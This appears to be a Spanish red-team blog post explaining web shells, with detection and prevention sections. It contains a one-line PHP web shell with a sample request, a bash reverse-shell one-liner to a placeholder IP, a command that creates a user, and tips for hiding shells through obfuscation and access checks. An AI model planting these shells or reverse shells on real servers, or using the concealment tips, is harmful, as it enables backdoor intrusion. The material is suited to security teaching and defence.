---
layout: post
title: "Web Shells: Tu consola secreta en el servidor"
author: "l1ttl3bugc4t"
date: "2025-06-09"
tags: [Web Shell, Pentesting, Shell Access, Red Team, Backdoor, Seguridad Web]
categories: [cuaderno, Red Team & Chill, CyberChallenges]
---

**Web Shells** son como tener una consola remota… pero *oculta en una página web*.  
Perfectas para mantener acceso después de explotar una vulnerabilidad 😼🖥️

---

## 🧠 ¿Qué es una Web Shell?

Una **web shell** es un archivo (generalmente `.php`, `.asp`, `.jsp`, etc.) que actúa como **una terminal interactiva dentro de una aplicación web**.  
Permite ejecutar comandos del sistema, subir archivos, navegar carpetas y mucho más desde un navegador.

---

## 🔥 Ejemplo básico (PHP)

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Accediendo a:

```
http://victima.com/shell.php?cmd=whoami
```

Resultado:

```
apache
```

---

## 🧪 Web Shells populares

| Nombre | Lenguaje | Funcionalidades |
|--------|----------|-----------------|
| `c99`  | PHP      | UI completa, navegación, comandos, SQL |
| `r57`  | PHP      | Más sigilosa, comandos básicos |
| `WSO`  | PHP      | Potente con GUI y opciones post-exploit |
| `China Chopper` | ASP / JSP | Usada en APTs, ultra pequeña |
| `B374K` | PHP     | Encriptada, con login y funciones avanzadas |

---

## 🚩 Cómo se instalan

- Subida mediante formularios sin validación
- Inclusión remota (RFI)
- Vulnerabilidades LFI + log poisoning
- Explotación de servicios FTP, SMB o CMS
- Desde una shell reversa temporal (como backdoor persistente)

---

## 🛠️ Comandos y trucos comunes

- Navegar archivos: `ls`, `cd`, `cat`
- Crear nuevo usuario: `net user nuevo /add`
- Reverse shell: `bash -i >& /dev/tcp/tu_ip/4444 0>&1`
- Escalar privilegios: enumerar SUIDs o usar linpeas

---

## 🔐 Recomendaciones para ocultarlas

- Nombres inocentes: `image.php`, `404.jsp`, `admin.asp`
- Codificación base64 o cifrado simple
- Comprobación de IP o user-agent antes de ejecutarse
- Uso de password para acceso

---

## 🧼 Cómo detectarlas

- Archivos nuevos o modificados en el servidor
- Comportamientos anómalos o comandos inesperados en logs
- Actividad de red saliente inusual
- Escaneo con herramientas como:
  - `LMD (Linux Malware Detect)`
  - `YARA Rules`
  - `ClamAV`

---

## 🛡️ Cómo prevenirlas

- Validar y restringir subida de archivos
- Configurar permisos adecuados (no permitir ejecución en `/uploads`)
- Filtrar extensiones, contenido y tipo MIME
- Monitorizar cambios en archivos sensibles
- Usar WAF y segmentación de roles

---

## ✨ Conclusión

Las **web shells** son puertas traseras disfrazadas de páginas inofensivas.  
Pequeñas, sigilosas… y letalmente efectivas en un pentest bien ejecutado 🐾💣

> _"Una shell es silenciosa… hasta que ejecutas tu primer comando."_ — **l1ttl3bugc4t**

---
